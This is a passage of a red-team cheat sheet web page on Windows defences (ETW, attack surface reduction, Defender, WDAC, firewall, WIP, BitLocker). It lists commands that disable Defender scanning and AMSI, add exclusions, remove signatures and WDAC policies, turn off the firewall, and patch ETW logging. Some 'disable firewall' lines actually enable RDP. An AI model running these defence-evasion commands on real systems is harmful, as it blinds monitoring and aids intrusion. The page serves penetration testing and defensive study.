+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">Provider</span>                                 <span class="n">GUID</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="n">Microsoft-Antimalware-Scan-Interface</span>     <span class="p">{</span><span class="n">2A576B87</span><span class="p">-</span><span class="n">09A7</span><span class="p">-</span><span class="n">520E-C21A</span><span class="p">-</span><span class="n">4942F0271D67</span><span class="p">}</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="n">Value</span>               <span class="n">Keyword</span>              <span class="n">Description</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="n">0x0000000000000001</span>  <span class="n">Event1</span>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="n">0x8000000000000000</span>  <span class="n">AMSI</span><span class="p">/</span><span class="n">Debug</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="n">Value</span>               <span class="n">Level</span>                <span class="n">Description</span>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="n">0x04</span>                <span class="n">win</span><span class="p">:</span><span class="n">Informational</span>    <span class="n">Information</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="n">PID</span>                 <span class="n">Image</span>
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="n">0x00002084</span>          <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="n">0x00002084</span>          <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a><span class="n">0x00001bd4</span>
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="n">0x00000ad0</span>
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="n">0x00000b98</span>
+</code></pre></div>
+<p>The <code>Microsoft-Windows-Threat-Intelligence</code> provider corresponds to ETWTI, an additional security feature that an EDR can subscribe to and identify malicious uses of APIs (e.g. process injection).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">0x0000000000000001</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">0x0000000000000002</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">0x0000000000000004</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">0x0000000000000008</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">0x0000000000000010</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">0x0000000000000020</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</span>
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="n">0x0000000000000040</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</span>
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="n">0x0000000000000080</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="n">0x0000000000000100</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</span>
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="n">0x0000000000000200</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</span>
+<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="n">0x0000000000000400</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</span>
+<a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="n">0x0000000000000800</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="n">0x0000000000001000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</span>
+<a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="n">0x0000000000002000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="n">0x0000000000004000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</span>
+<a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="n">0x0000000000008000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="n">0x0000000000010000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_READVM_LOCAL</span>
+<a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="n">0x0000000000020000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_READVM_REMOTE</span>
+<a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="n">0x0000000000040000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</span>
+<a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="n">0x0000000000080000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</span>
+<a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a><span class="n">0x0000000000100000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</span>
+<a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a><span class="n">0x0000000000200000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_RESUME_THREAD</span>
+<a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a><span class="n">0x0000000000400000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</span>
+<a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="n">0x0000000000800000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</span>
+</code></pre></div>
+<p>The most common bypassing technique is patching the function <code>EtwEventWrite</code> which is called to write/log ETW events. You can list the providers registered for a process with <code>logman query providers -pid &lt;PID&gt;</code></p>
+<h2 id="attack-surface-reduction">Attack Surface Reduction</h2>
+<blockquote>
+<p>Attack Surface Reduction (ASR) refers to strategies and techniques used to decrease the potential points of entry that attackers could use to exploit a system or network.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Add-MpPreference</span> <span class="n">-AttackSurfaceReductionRules_Ids</span> <span class="p">&lt;</span><span class="n">Id</span><span class="p">&gt;</span> <span class="n">-AttackSurfaceReductionRules_Actions</span> <span class="n">AuditMode</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nb">Add-MpPreference</span> <span class="n">-AttackSurfaceReductionRules_Ids</span> <span class="p">&lt;</span><span class="n">Id</span><span class="p">&gt;</span> <span class="n">-AttackSurfaceReductionRules_Actions</span> <span class="n">Enabled</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Description</th>
+<th>Id</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Block execution of potentially obfuscated scripts</td>
+<td>5beb7efe-fd9a-4556-801d-275e5ffc04cc</td>
+</tr>
+<tr>
+<td>Block JavaScript or VBScript from launching downloaded executable content</td>
+<td>d3e037e1-3eb8-44c8-a917-57927947596d</td>
+</tr>
+<tr>
+<td>Block abuse of exploited vulnerable signed drivers</td>
+<td>56a863a9-875e-4185-98a7-b882c64b5ce5</td>
+</tr>
+<tr>
+<td>Block executable content from email client and webmail</td>
+<td>be9ba2d9-53ea-4cdc-84e5-9b1eeee46550</td>
+</tr>
+<tr>
+<td>Block process creations originating from PSExec and WMI commands</td>
+<td>d1e49aac-8f56-4280-b9ba-993a6d77406c</td>
+</tr>
+<tr>
+<td>Use advanced protection against ransomware</td>
+<td>c1db55ab-c21a-4637-bb3f-a12568109d35</td>
+</tr>
+<tr>
+<td>Block credential stealing from the Windows local security authority subsystem (lsass.exe)</td>
+<td>9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2</td>
+</tr>
+</tbody>
+</table>
+<h2 id="windows-defender-antivirus">Windows Defender Antivirus</h2>
+<p>Also known as <code>Microsoft Defender</code>.</p>
+<ul>
+<li>
+<p>Check status of Defender
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-MpComputerStatus</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Disable scanning all downloaded files and attachments
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span><span class="p">;</span> <span class="nb">Get-MpComputerStatus</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableIOAVProtection</span> <span class="nv">$true</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Disable AMSI (set to 0 to enable)
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableScriptScanning</span> <span class="n">1</span> 
+</code></pre></div></p>
+</li>
+<li>
+<p>Exclude a folder, a process from scanning
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&quot;C:\Temp&quot;</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&quot;C:\Windows\Tasks&quot;</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="s2">&quot;word.exe&quot;</span><span class="p">,</span> <span class="s2">&quot;vmwp.exe&quot;</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Exclude a folder using WMI
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">WMIC</span> <span class="p">/</span><span class="n">Namespace</span><span class="p">:\\</span><span class="n">root</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Defender</span> <span class="n">class</span> <span class="n">MSFT_MpPreference</span> <span class="n">call</span> <span class="n">Add</span> <span class="n">ExclusionPath</span><span class="p">=</span><span class="s2">&quot;C:\Users\Public\wmic&quot;</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Remove signatures. <strong>NOTE</strong>: if Internet connection is present, they will be downloaded again.
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">&amp;</span> <span class="s2">&quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot;</span> <span class="n">-RemoveDefinitions</span> <span class="n">-All</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">&amp;</span> <span class="s2">&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot;</span> <span class="n">-RemoveDefinitions</span> <span class="n">-All</span>
+</code></pre></div></p>
+</li>
+</ul>
+<p>Identify the exact bytes that are detected by Windows Defender Antivirus</p>
+<ul>
+<li><a href="https://github.com/matterpreter/DefenderCheck">matterpreter/DefenderCheck</a> - Identifies the bytes that Microsoft Defender flags on</li>
+<li><a href="https://github.com/gatariee/gocheck">gatariee/gocheck</a> - DefenderCheck but blazingly fast™</li>
+</ul>
+<h2 id="windows-defender-application-control">Windows Defender Application Control</h2>
+<p>Also known as <code>WDAC/UMCI/Device Guard</code>.</p>
+<blockquote>
+<p>Windows Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers, and scripts. WDAC does not trust any software it does not know of.</p>
+</blockquote>
+<ul>
+<li>
+<p>Get WDAC current mode
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="p">$</span> <span class="nb">Get-ComputerInfo</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">DeviceGuardCodeIntegrityPolicyEnforcementStatus</span>         <span class="p">:</span> <span class="n">EnforcementMode</span>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus</span> <span class="p">:</span> <span class="n">EnforcementMode</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Remove WDAC policies using CiTool.exe (Windows 11 2022 Update)
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">$</span> <span class="n">CiTool</span><span class="p">.</span><span class="n">exe</span> <span class="n">-rp</span> <span class="s2">&quot;{PolicyId GUID}&quot;</span> <span class="n">-json</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Device Guard policy location: <code>C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip</code></p>
+</li>
+<li>Device Guard example policies: <code>C:\Windows\System32\CodeIntegrity\ExamplePolicies\</code></li>
+<li>WDAC utilities: <a href="https://github.com/mattifestation/WDACTools">mattifestation/WDACTools</a>, a PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies</li>
+<li>WDAC bypass techniques: <a href="https://github.com/bohops/UltimateWDACBypassList">bohops/UltimateWDACBypassList</a><ul>
+<li><a href="https://github.com/nettitude/Aladdin">nettitude/Aladdin</a> - WDAC Bypass using AddInProcess.exe</li>
+</ul>
+</li>
+</ul>
+<h2 id="windows-defender-firewall">Windows Defender Firewall</h2>
+<ul>
+<li>
+<p>List firewall state and current configuration
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">dump</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="c"># or </span>
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">state</span>
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">config</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>List firewall's blocked ports
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nv">$f</span><span class="p">=</span><span class="nb">New-object</span> <span class="n">-comObject</span> <span class="n">HNetCfg</span><span class="p">.</span><span class="n">FwPolicy2</span><span class="p">;</span><span class="nv">$f</span><span class="p">.</span><span class="n">rules</span> <span class="p">|</span>  <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">action</span> <span class="o">-eq</span> <span class="s2">&quot;0&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">applicationname</span><span class="p">,</span><span class="n">localports</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Disable firewall
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c"># Disable Firewall via cmd</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span>  <span class="p">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c"># Disable Firewall via Powershell</span>
+<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-command</span> <span class="s1">&#39;Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; –Value&#39;</span><span class="p">`</span>
+<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
+<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c"># Disable Firewall on any windows using native command</span>
+<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="nb">set </span><span class="n">opmode</span> <span class="n">disable</span>
+<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="n">netsh</span> <span class="n">Advfirewall</span> <span class="nb">set </span><span class="n">allprofiles</span> <span class="n">state</span> <span class="n">off</span>
+</code></pre></div></p>
+</li>
+</ul>
+<h2 id="windows-information-protection">Windows Information Protection</h2>
+<p>Windows Information Protection (WIP), formerly known as Enterprise Data Protection (EDP), is a security feature in Windows 10 that helps protect sensitive data on enterprise devices. WIP helps to prevent accidental data leakage by allowing administrators to define policies that control how enterprise data can be accessed, shared, and protected. WIP works by identifying and separating enterprise data from personal data on the device. </p>
+<p>Protection of file (data) locally marked as corporate is facilitated via Encrypting File System (EFS) encryption of Windows (a feature of NTFS file system)</p>
+<ul>
+<li>Enumerate files attributes, <code>Encrypted</code> attribute is used for files protected by WIP
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="p">(</span><span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s1">&#39;C:\...&#39;</span><span class="p">).</span><span class="n">attributes</span>
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="n">Archive</span><span class="p">,</span> <span class="n">Encrypted</span>
+</code></pre></div></li>
+<li>Encrypt files: <code>cipher /c encryptedfile.extension</code></li>
+<li>Decrypt files: <code>cipher /d encryptedfile.extension</code></li>
+</ul>
+<p>The <strong>Enterprise Context</strong> column shows you what each app can do with your enterprise data:</p>
+<ul>
+<li><strong>Domain</strong>. Shows the employee's work domain (such as, corp.contoso.com). This app is considered work-related and can freely touch and open work data and resources.</li>
+<li><strong>Personal</strong>. Shows the text, Personal. This app is considered non-work-related and can't touch any work data or resources.</li>
+<li><strong>Exempt</strong>. Shows the text, Exempt. Windows Information Protection policies don't apply to these apps (such as, system components).</li>
+</ul>
+<h2 id="bitlocker-drive-encryption">BitLocker Drive Encryption</h2>
+<p>BitLocker is a full-disk encryption feature included in Microsoft Windows operating systems starting with Windows Vista. It is designed to protect data by providing encryption for entire volumes. BitLocker uses AES encryption algorithm to encrypt data on the disk. When enabled, BitLocker requires a user to enter a password or insert a USB flash drive to unlock the encrypted volume before the operating system is loaded, ensuring that data on the disk is protected from unauthorized access. BitLocker is commonly used on laptops, portable storage devices, and other mobile devices to protect sensitive data in case of theft or loss.</p>
+<p>When BitLocker is in <code>Suspended</code> state, boot the system using a Windows Setup USB, and then decrypt the drive using this command: <code>manage-bde -off c:</code></p>
+<p>You can check if it is done decrypting using this command: <code>manage-bde -status</code></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf">SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3">PowerShell about_Logging_Windows - Microsoft Documentation</a></li>
+<li><a href="https://itm4n.github.io/lsass-runasppl/">Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - Apr 7, 2021</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context">Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - 03/10/2023 - Microsoft</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate">Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - 12/09/2022 - Microsoft</a></li>
+<li><a href="https://www.trustedsec.com/blog/disabling-av-with-process-suspension/">DISABLING AV WITH PROCESS SUSPENSION - March 24, 2023 - By Christopher Paschen </a></li>
+<li><a href="https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/">Disabling Event Tracing For Windows - UNPROTECT PROJECT - Tuesday 19 April 2022</a></li>
+<li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101">ETW: Event Tracing for Windows 101 - ired.team</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies">Remove Windows Defender Application Control (WDAC) policies - Microsoft - 12/09/2022</a></li>
+<li><a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide">Attack surface reduction rules reference - Microsoft 365 - 11/30/2023</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="March 14, 2025 14:33:05">March 14, 2025</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+  <div class="social-container">
+    <b>Share this content</b>
+    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+      <a class="a2a_button_x"></a>
+      <a class="a2a_button_telegram"></a>
+      <a class="a2a_button_linkedin"></a>
+      <a class="a2a_button_email"></a>
+      <a class="a2a_button_microsoft_teams"></a>
+    </div>
+    <br>
+    <script async src="https://static.addtoany.com/menu/page.js"></script>
+  </div>
+  <script defer src="https://cloud.umami.is/script.js" data-website-id="49aad71c-7d98-4635-8bd5-b6799c8874f8"></script>
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
